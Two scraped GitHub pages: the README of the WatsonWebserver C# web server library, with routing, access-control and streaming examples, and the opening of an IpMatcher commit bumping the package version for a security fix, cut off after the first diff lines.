=== Content from github.com_a61a21b9_20250108_125201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdotnet%2FWatsonWebserver)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdotnet%2FWatsonWebserver)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=dotnet%2FWatsonWebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dotnet](/dotnet)
/
**[WatsonWebserver](/dotnet/WatsonWebserver)**
Public

* [Notifications](/login?return_to=%2Fdotnet%2FWatsonWebserver) You must be signed in to change notification settings
* [Fork
  86](/login?return_to=%2Fdotnet%2FWatsonWebserver)
* [Star
   429](/login?return_to=%2Fdotnet%2FWatsonWebserver)

Watson is the fastest, easiest way to build scalable RESTful web servers and services in C#.

### License

[MIT license](/dotnet/WatsonWebserver/blob/master/LICENSE.md)

[429
stars](/dotnet/WatsonWebserver/stargazers) [86
forks](/dotnet/WatsonWebserver/forks) [Branches](/dotnet/WatsonWebserver/branches) [Tags](/dotnet/WatsonWebserver/tags) [Activity](/dotnet/WatsonWebserver/activity)
 [Star](/login?return_to=%2Fdotnet%2FWatsonWebserver)

 [Notifications](/login?return_to=%2Fdotnet%2FWatsonWebserver) You must be signed in to change notification settings

* [Code](/dotnet/WatsonWebserver)
* [Issues
  4](/dotnet/WatsonWebserver/issues)
* [Pull requests
  0](/dotnet/WatsonWebserver/pulls)
* [Discussions](/dotnet/WatsonWebserver/discussions)
* [Actions](/dotnet/WatsonWebserver/actions)
* [Projects
  0](/dotnet/WatsonWebserver/projects)
* [Wiki](/dotnet/WatsonWebserver/wiki)
* [Security](/dotnet/WatsonWebserver/security)
* [Insights](/dotnet/WatsonWebserver/pulse)

Additional navigation options

* [Code](/dotnet/WatsonWebserver)
* [Issues](/dotnet/WatsonWebserver/issues)
* [Pull requests](/dotnet/WatsonWebserver/pulls)
* [Discussions](/dotnet/WatsonWebserver/discussions)
* [Actions](/dotnet/WatsonWebserver/actions)
* [Projects](/dotnet/WatsonWebserver/projects)
* [Wiki](/dotnet/WatsonWebserver/wiki)
* [Security](/dotnet/WatsonWebserver/security)
* [Insights](/dotnet/WatsonWebserver/pulse)

# dotnet/WatsonWebserver

    master[Branches](/dotnet/WatsonWebserver/branches)[Tags](/dotnet/WatsonWebserver/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[254 Commits](/dotnet/WatsonWebserver/commits/master/) | | |
| [.github](/dotnet/WatsonWebserver/tree/master/.github ".github") | | [.github](/dotnet/WatsonWebserver/tree/master/.github ".github") |  |  |
| [assets](/dotnet/WatsonWebserver/tree/master/assets "assets") | | [assets](/dotnet/WatsonWebserver/tree/master/assets "assets") |  |  |
| [src](/dotnet/WatsonWebserver/tree/master/src "src") | | [src](/dotnet/WatsonWebserver/tree/master/src "src") |  |  |
| [.gitignore](/dotnet/WatsonWebserver/blob/master/.gitignore ".gitignore") | | [.gitignore](/dotnet/WatsonWebserver/blob/master/.gitignore ".gitignore") |  |  |
| [CHANGELOG.md](/dotnet/WatsonWebserver/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/dotnet/WatsonWebserver/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [CODE\_OF\_CONDUCT.md](/dotnet/WatsonWebserver/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") | | [CODE\_OF\_CONDUCT.md](/dotnet/WatsonWebserver/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") |  |  |
| [CONTRIBUTING.md](/dotnet/WatsonWebserver/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/dotnet/WatsonWebserver/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [DONATIONS.md](/dotnet/WatsonWebserver/blob/master/DONATIONS.md "DONATIONS.md") | | [DONATIONS.md](/dotnet/WatsonWebserver/blob/master/DONATIONS.md "DONATIONS.md") |  |  |
| [LICENSE.md](/dotnet/WatsonWebserver/blob/master/LICENSE.md "LICENSE.md") | | [LICENSE.md](/dotnet/WatsonWebserver/blob/master/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/dotnet/WatsonWebserver/blob/master/README.md "README.md") | | [README.md](/dotnet/WatsonWebserver/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* MIT license

[![alt tag](https://github.com/jchristn/watsonwebserver/raw/master/assets/watson.ico)](https://github.com/jchristn/watsonwebserver/blob/master/assets/watson.ico)

# Watson Webserver

Simple, scalable, fast, async web server for processing RESTful HTTP/HTTPS requests, written in C#.

| Package | NuGet Version | Downloads |
| --- | --- | --- |
| Watson | [NuGet Version](https://www.nuget.org/packages/Watson/) | [NuGet](https://www.nuget.org/packages/Watson) |
| Watson.Lite | [NuGet Version](https://www.nuget.org/packages/Watson.Lite/) | [NuGet](https://www.nuget.org/packages/Watson.Lite) |
| Watson.Core | [NuGet Version](https://www.nuget.org/packages/Watson.Core/) | [NuGet](https://www.nuget.org/packages/Watson.Core) |

Special thanks to @DamienDennehy for allowing us the use of the `Watson.Core` package name in NuGet!

## .NET Foundation

This project is part of the [.NET Foundation](http://www.dotnetfoundation.org/projects) along with other projects like [the .NET Runtime](https://github.com/dotnet/runtime/).

## New in v6.3.x

* Minor change to chunked transfer, i.e. `SendChunk` now accepts `isFinal` as a `Boolean` property
* Added support for server-sent events, included `Test.ServerSentEvents` project
* Minor internal refactor

## Special Thanks

I'd like to extend a special thanks to those that have helped make Watson Webserver better.

* @notesjor @shdwp @Tutch @GeoffMcGrath @jurkovic-nikola @joreg @Job79 @at1993
* @MartyIX @pocsuka @orinem @deathbull @binozo @panboy75 @iain-cyborn @gamerhost31
* @nhaberl @grgouala @sapurtcomputer30 @winkmichael @sqlnew @SaintedPsycho @Return25
* @marcussacana @samisil @Jump-Suit @ChZhongPengCheng33 @bobaoapae @rodgers-r
* @john144 @zedle @GitHubProUser67 @bemoty @bemon @nomadeon

## Watson vs Watson.Lite

Watson is a webserver that operates on top of the underlying `http.sys` within the operating system. Watson.Lite was created by merging [HttpServerLite](https://github.com/jchristn/HttpServerLite). Watson.Lite does not have a dependency on `http.sys`, and is implemented using a TCP implementation provided by [CavemanTcp](https://github.com/jchristn/cavemantcp).

The dependency on `http.sys` (or lack thereof) creates subtle differences between the two libraries, however, the configuration and management of each should be consistent.

Watson.Lite is generally less performant than Watson, because the HTTP implementation is in user space.

## Important Notes

* Elevation (administrative privileges) may be required if binding an IP other than `127.0.0.1` or `localhost`
* For Watson:
  + The HTTP HOST header must match the specified binding
  + For SSL, the underlying computer certificate store will be used
* For Watson.Lite:
  + Watson.Lite uses a TCP listener; your server must be started with an IP address, not a hostname
  + The HTTP HOST header does not need to match, since the listener must be defined by IP address
  + For SSL, the certificate filename, filename and password, or `X509Certificate2` must be supplied

## Routing

Watson and Watson.Lite always routes in the following order (configure using `Webserver.Routes`):

* `.Preflight` - handling preflight requests (generally with HTTP method `OPTIONS`)
* `.PreRouting` - always invoked before any routing determination is made
* `.PreAuthentication` - a routing group, comprised of:
  + `.Static` - static routes, e.g. an HTTP method and an explicit URL
  + `.Content` - file serving routes, e.g. a directory where files can be read
  + `.Parameter` - routes where variables are specified in the path, e.g. `/user/{id}`
  + `.Dynamic` - routes where the URL is defined by a regular expression
* `.AuthenticateRequest` - demarcation route between unauthenticated and authenticated routes
* `.PostAuthentication` - a routing group with a structure identical to `.PreAuthentication`
* `.Default` - the default route; all requests go here if not routed previously
* `.PostRouting` - always invoked, generally for logging and telemetry

If you do not wish to use authentication, you should map your routes in the `.PreAuthentication` routing group (though technically they can be placed in `.PostAuthentication` or `.Default` assuming the `AuthenticateRequest` method is null.

As a general rule, never try to send data to an `HttpResponse` while in the `.PostRouting` route. If a response has already been sent, the attempt inside of `.PostRouting` will fail.

## Authentication

It is recommended that you implement authentication in `.AuthenticateRequest`. Should a request fail authentication, return a response within that route. The `HttpContextBase` class has properties that can hold authentication-related or session-related metadata, specifically, `.Metadata`.

## Access Control

By default, Watson and Watson.Lite will permit all inbound connections.

* If you want to block certain IPs or networks, use `Server.AccessControl.DenyList.Add(ip, netmask)`
* If you only want to allow certain IPs or networks, and block all others, use:
  + `Server.AccessControl.Mode = AccessControlMode.DefaultDeny`
  + `Server.AccessControl.PermitList.Add(ip, netmask)`

## Simple Example

Refer to `Test.Default` for a full example.

```
using System.IO;
using System.Text;
using WatsonWebserver;

static void Main(string[] args)
{
  WebserverSettings settings = new WebserverSettings("127.0.0.1", 9000);
  Webserver server = new Webserver(settings, DefaultRoute);
  server.Start();
  Console.ReadLine();
}

static async Task DefaultRoute(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the default route!");
```

Then, open your browser to `http://127.0.0.1:9000/`.

## Example with Routes

Refer to `Test.Routing` for a full example.

```
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using WatsonWebserver;

static void Main(string[] args)
{
  WebserverSettings settings = new WebserverSettings("127.0.0.1", 9000);
  Webserver server = new Webserver(settings, DefaultRoute);

  // add content routes
  server.Routes.PreAuthentication.Content.Add("/html/", true);
  server.Routes.PreAuthentication.Content.Add("/img/watson.jpg", false);

  // add static routes
  server.Routes.PreAuthentication.Static.Add(HttpMethod.GET, "/hello/", GetHelloRoute);
  server.Routes.PreAuthentication.Static.Add(HttpMethod.GET, "/howdy/", async (HttpContextBase ctx) =>
  {
      await ctx.Response.Send("Hello from the GET /howdy static route!");
      return;
  });

  // add parameter routes
  server.Routes.PreAuthentication.Parameter.Add(HttpMethod.GET, "/{version}/bar", GetBarRoute);

  // add dynamic routes
  server.Routes.PreAuthentication.Dynamic.Add(HttpMethod.GET, new Regex("^/foo/\\d+$"), GetFooWithId);
  server.Routes.PreAuthentication.Dynamic.Add(HttpMethod.GET, new Regex("^/foo/?$"), GetFoo);

  // start the server
  server.Start();

  Console.WriteLine("Press ENTER to exit");
  Console.ReadLine();
}

static async Task GetHelloRoute(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the GET /hello static route!");

static async Task GetBarRoute(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the GET /" + ctx.Request.Url.Parameters["version"] + "/bar route!");

static async Task GetFooWithId(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the GET /foo/[id] dynamic route!");

static async Task GetFoo(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the GET /foo/ dynamic route!");

static async Task DefaultRoute(HttpContextBase ctx) =>
  await ctx.Response.Send("Hello from the default route!");
```

## Route with Exception Handler

```
server.Routes.PreAuthentication.Static.Add(HttpMethod.GET, "/hello/", GetHelloRoute, MyExceptionRoute);

static async Task GetHelloRoute(HttpContextBase ctx) => throw new Exception("Whoops!");

static async Task MyExceptionRoute(HttpContextBase ctx, Exception e)
{
  ctx.Response.StatusCode = 500;
  await ctx.Response.Send(e.Message);
}
```

## Permit or Deny by IP or Network

```
Webserver server = new Webserver("127.0.0.1", 9000, false, DefaultRoute);

// set default permit (permit any) with deny list to block specific IP addresses or networks
server.Settings.AccessControl.Mode = AccessControlMode.DefaultPermit;
server.Settings.AccessControl.DenyList.Add("127.0.0.1", "255.255.255.255");

// set default deny (deny all) with permit list to permit specific IP addresses or networks
server.Settings.AccessControl.Mode = AccessControlMode.DefaultDeny;
server.Settings.AccessControl.PermitList.Add("127.0.0.1", "255.255.255.255");
```

## Chunked Transfer-Encoding

Watson supports both receiving chunked data and sending chunked data (indicated by the header `Transfer-Encoding: chunked`).

Refer to `Test.ChunkServer` for a sample implementation.

### Receiving Chunked Data

```
static async Task UploadData(HttpContextBase ctx)
{
  if (ctx.Request.ChunkedTransfer)
  {
    bool finalChunk = false;
    while (!finalChunk)
    {
      Chunk chunk = await ctx.Request.ReadChunk();
      // work with chunk.Length and chunk.Data (byte[])
      finalChunk = chunk.IsFinalChunk;
    }
  }
  else
  {
    // read from ctx.Request.Data stream
  }
}
```

### Sending Chunked Data

```
static async Task DownloadChunkedFile(HttpContextBase ctx)
{
  using (FileStream fs = new FileStream("./img/watson.jpg", , FileMode.Open, FileAccess.Read))
  {
    ctx.Response.StatusCode = 200;
    ctx.Response.ChunkedTransfer = true;

    byte[] buffer = new byte[4096];
    while (true)
    {
      int bytesRead = await fs.ReadAsync(buffer, 0, buffer.Length);
      byte[] data = new byte[bytesRead];
      Buffer.BlockCopy(buffer, 0, bytesRead, data, 0); // only copy the read data

      if (bytesRead > 0)
      {
        await ctx.Response.SendChunk(data, false);
      }
      else
      {
        await ctx.Response.SendChunk(Array.Empty<byte>(), true);
        break;
      }
    }
  }

  return;
}
```

## Server-Sent Events

Watson supports sending server-sent events. Refer to `Test.ServerSentEvents` for a sample implementation. The `SendEvent` method handles prepending `data:`  and the following `\n\n` to your message.

### Sending Events

```
static async Task SendEvents(HttpContextBase ctx)
{
  ctx.Response.StatusCode = 200;
  ctx.Response.ServerSentEvents = true;

  while (true)
  {
    string data = GetNextEvent(); // your implementation
    if (!String.IsNullOrEmpty(data))
    {
      await ctx.Response.SendEvent(data);
    }
    else
    {
      break;
    }
  }

  return;
}
```

## HostBuilder

`HostBuilder` helps you set up your server much more easily by introducing a chain of settings and routes instead of using the server class directly. Special thanks to @sapurtcomputer30 for producing this fine feature!

Refer to `Test.HostBuilder` for a full sample implementation.

```
using WatsonWebserver.Extensions.HostBuilderExtension;

Webserver server = new HostBuilder("127.0.0.1", 8000, false, DefaultRoute)
  .MapStaticRoute(HttpMethod.GET, GetUrlsRoute, "/links")
  .MapStaticRoute(HttpMethod.POST, CheckLoginRoute, "/login")
  .MapStaticRoute(HttpMethod.POST, TestRoute, "/test")
  .Build();

server.Start();

Console.WriteLine("Server started");
Console.ReadKey();

static async Task DefaultRoute(HttpContextBase ctx) =>
    await ctx.Response.Send("Hello from default route!");

static async Task GetUrlsRoute(HttpContextBase ctx) =>
    await ctx.Response.Send("Here are your links!");

static async Task CheckLoginRoute(HttpContextBase ctx) =>
    await ctx.Response.Send("Checking your login!");

static async Task TestRoute(HttpContextBase ctx) =>
    await ctx.Response.Send("Hello from the test route!");
```

## Accessing from Outside Localhost

### Watson

When you configure Watson to listen on `127.0.0.1` or `localhost`, it will only respond to requests received from within the local machine.

To configure access from other nodes outside of `localhost`, use the following:

* Specify the exact DNS hostname upon which Watson should listen in the Server constructor
* The HOST header on HTTP requests MUST match the supplied listener value (operating system limitation)
* If you want to listen on more than one hostname or IP address, use `*` or `+`. You MUST run as administrator (operating system limitation)
* If you want to use a port number less than 1024, you MUST run as administrator (operating system limitation)
* Open a port on your firewall to permit traffic on the TCP port upon which Watson is listening
* You may have to add URL ACLs, i.e. URL bindings, within the operating system using the `netsh` command:
  + Check for existing bindings using `netsh http show urlacl`
  + Add a binding using `netsh http add urlacl url=http://[hostname]:[port]/ user=everyone listen=yes`
  + Where `hostname` and `port` are the values you are using in the constructor
  + If you are using SSL, you will need to install the certificate in the certificate store and retrieve the thumbprint
  + Refer to <https://github.com/jchristn/WatsonWebserver/wiki/Using-SSL-on-Windows> for more information, or if you are using SSL
* If you're still having problems, start a discussion here, and I will do my best to help and update the documentation.

### Watson.Lite

When you configure Watson.Lite to listen on `127.0.0.1`, it will only respond to requests received from within the local machine.

To configure access from other nodes outside of the local machine, use the following:

* Specify the IP address of the network interface on which Watson.Lite should listen
* If you want to listen on more than one network interface, use `*` or `+`. You MUST run as administrator (operating system limitation)
* If you want to use a port number less than 1024, you MUST run as administrator (operating system limitation)
* Open a port on your firewall to permit traffic on the TCP port upon which Watson is listening
* If you are using SSL, you will need to have one of the following when instantiating:
  + The `X509Certificate2` object
  + The filename and password to the certificate
* If you're still having problems, start a discussion here, and I will do my best to help and update the documentation.

## Running in Docker

Please refer to the `Test.Docker` project and the `Docker.md` file therein.

## Version History

Refer to CHANGELOG.md for version history.

## About

Watson is the fastest, easiest way to build scalable RESTful web servers and services in C#.

### Topics

[http](/topics/http "Topic: http")
[cloud](/topics/cloud "Topic: cloud")
[web](/topics/web "Topic: web")
[rest](/topics/rest "Topic: rest")
[stream](/topics/stream "Topic: stream")
[server](/topics/server "Topic: server")
[watson](/topics/watson "Topic: watson")
[nuget](/topics/nuget "Topic: nuget")
[https](/topics/https "Topic: https")
[rest-api](/topics/rest-api "Topic: rest-api")
[restful](/topics/restful "Topic: restful")
[multithreading](/topics/multithreading "Topic: multithreading")
[restapi](/topics/restapi "Topic: restapi")
[webapp](/topics/webapp "Topic: webapp")
[http-server](/topics/http-server "Topic: http-server")
[endpoint](/topics/endpoint "Topic: endpoint")
[https-server](/topics/https-server "Topic: https-server")
[dynamic-routes](/topics/dynamic-routes "Topic: dynamic-routes")
[watson-webserver](/topics/watson-webserver "Topic: watson-webserver")
[httpresponse](/topics/httpresponse "Topic: httpresponse")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)

[Activity](/dotnet/WatsonWebserver/activity)
[Custom properties](/dotnet/WatsonWebserver/custom-properties)
### Stars

[**429**
stars](/dotnet/WatsonWebserver/stargazers)
### Watchers

[**23**
watching](/dotnet/WatsonWebserver/watchers)
### Forks

[**86**
forks](/dotnet/WatsonWebserver/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fdotnet%2FWatsonWebserver&report=dotnet+%28user%29)

## [Releases 7](/dotnet/WatsonWebserver/releases)

[3.0.1
Latest

Sep 3, 2019](/dotnet/WatsonWebserver/releases/tag/3.0.1)
[+ 6 releases](/dotnet/WatsonWebserver/releases)

## Sponsor this project

* <https://paypal.me/joelchristner>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/dotnet/packages?repo_name=WatsonWebserver)

No packages published

## [Contributors 14](/dotnet/WatsonWebserver/graphs/contributors)

* [![@jchristn](https://avatars.githubusercontent.com/u/1421081?s=64&v=4)](https://github.com/jchristn)
* [![@GitHubProUser67](https://avatars.githubusercontent.com/u/127040195?s=64&v=4)](https://github.com/GitHubProUser67)
* [![@panboy75](https://avatars.githubusercontent.com/u/53339525?s=64&v=4)](https://github.com/panboy75)
* [![@zsolt777](https://avatars.githubusercontent.com/u/71219031?s=64&v=4)](https://github.com/zsolt777)
* [![@job79](https://avatars.githubusercontent.com/u/38859657?s=64&v=4)](https://github.com/job79)
* [![@imrostami](https://avatars.githubusercontent.com/u/26039089?s=64&v=4)](https://github.com/imrostami)
* [![@joreg](https://avatars.githubusercontent.com/u/1067952?s=64&v=4)](https://github.com/joreg)
* [![@shdwp](https://avatars.githubusercontent.com/u/1116392?s=64&v=4)](https://github.com/shdwp)
* [![@bemon](https://avatars.githubusercontent.com/u/5008982?s=64&v=4)](https://github.com/bemon)
* [![@Tutch](https://avatars.githubusercontent.com/u/7583835?s=64&v=4)](https://github.com/Tutch)
* [![@GeoffMcGrath](https://avatars.githubusercontent.com/u/11505368?s=64&v=4)](https://github.com/GeoffMcGrath)
* [![@bemoty](https://avatars.githubusercontent.com/u/16725421?s=64&v=4)](https://github.com/bemoty)
* [![@rodgers-r](https://avatars.githubusercontent.com/u/67060582?s=64&v=4)](https://github.com/rodgers-r)
* [![@Binozo](https://avatars.githubusercontent.com/u/70137898?s=64&v=4)](https://github.com/Binozo)

## Languages

* [C#
  99.9%](/dotnet/WatsonWebserver/search?l=c%23)
* Other
  0.1%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_674f22b8_20250108_125200.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher%2Fcommit%2F81d77c2f33aa912dbd032b34b9e184fc6e041d89)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher%2Fcommit%2F81d77c2f33aa912dbd032b34b9e184fc6e041d89)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=jchristn%2FIpMatcher)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jchristn](/jchristn)
/
**[IpMatcher](/jchristn/IpMatcher)**
Public

* [Notifications](/login?return_to=%2Fjchristn%2FIpMatcher) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2Fjchristn%2FIpMatcher)
* [Star
   15](/login?return_to=%2Fjchristn%2FIpMatcher)

* [Code](/jchristn/IpMatcher)
* [Issues
  0](/jchristn/IpMatcher/issues)
* [Pull requests
  0](/jchristn/IpMatcher/pulls)
* [Actions](/jchristn/IpMatcher/actions)
* [Projects
  0](/jchristn/IpMatcher/projects)
* [Security](/jchristn/IpMatcher/security)
* [Insights](/jchristn/IpMatcher/pulse)

Additional navigation options

* [Code](/jchristn/IpMatcher)
* [Issues](/jchristn/IpMatcher/issues)
* [Pull requests](/jchristn/IpMatcher/pulls)
* [Actions](/jchristn/IpMatcher/actions)
* [Projects](/jchristn/IpMatcher/projects)
* [Security](/jchristn/IpMatcher/security)
* [Insights](/jchristn/IpMatcher/pulse)

## Commit

[Permalink](/jchristn/IpMatcher/commit/81d77c2f33aa912dbd032b34b9e184fc6e041d89)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

NuGet v1.0.4.2, fix for SICK-2021-060

[Browse files](/jchristn/IpMatcher/tree/81d77c2f33aa912dbd032b34b9e184fc6e041d89)
Browse the repository at this point in the history

* Loading branch information

[![@jchristn](https://avatars.githubusercontent.com/u/1421081?s=40&v=4)](/jchristn)

[jchristn](/jchristn/IpMatcher/commits?author=jchristn "View all commits by jchristn")
committed
Aug 18, 2021

1 parent
[b697b9c](/jchristn/IpMatcher/commit/b697b9c4d3be48384bf7ca5882035a4cce9f2051)

commit 81d77c2

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**28 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* IpMatcher

  + IpMatcher/IpMatcher.csproj
    [IpMatcher.csproj](#diff-39a22ac6dd7db83de5dd41fc83cc5b6201ea79bd7db0b59d76359994390abc16)
  + IpMatcher/IpMatcher.xml
    [IpMatcher.xml](#diff-a3644734fd78907677cfa4db18592acb8b783b6a20e47d095e27817f4c7b5b8c)
  + IpMatcher/Matcher.cs
    [Matcher.cs](#diff-403346089db89dfb97e1cb61d3514681ec1d37af374676a29126583e136bb173)

## There are no files selected for viewing

10 changes: 7 additions & 3 deletions

10
[IpMatcher/IpMatcher.csproj](#diff-39a22ac6dd7db83de5dd41fc83cc5b6201ea79bd7db0b59d76359994390abc16 "IpMatcher/IpMatcher.csproj")

Show comments

[View file](/jchristn/IpMatcher/blob/81d77c2f33aa912dbd032b34b9e184fc6e041d89/IpMatcher/IpMatcher.csproj)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,21 +3,25 @@ |
|  |  | <PropertyGroup> |
|  |  | <TargetFrameworks>netstandard2.0;netstandard2.1;netcoreapp3.1;net452;net5.0</TargetFrameworks> |
|  |  | <GeneratePackageOnBuild>true</GeneratePackageOnBuild> |
|  |  | <Version>1.0.4.1</Version> |
|  |  | <Version>1.0.4.2</Version> |
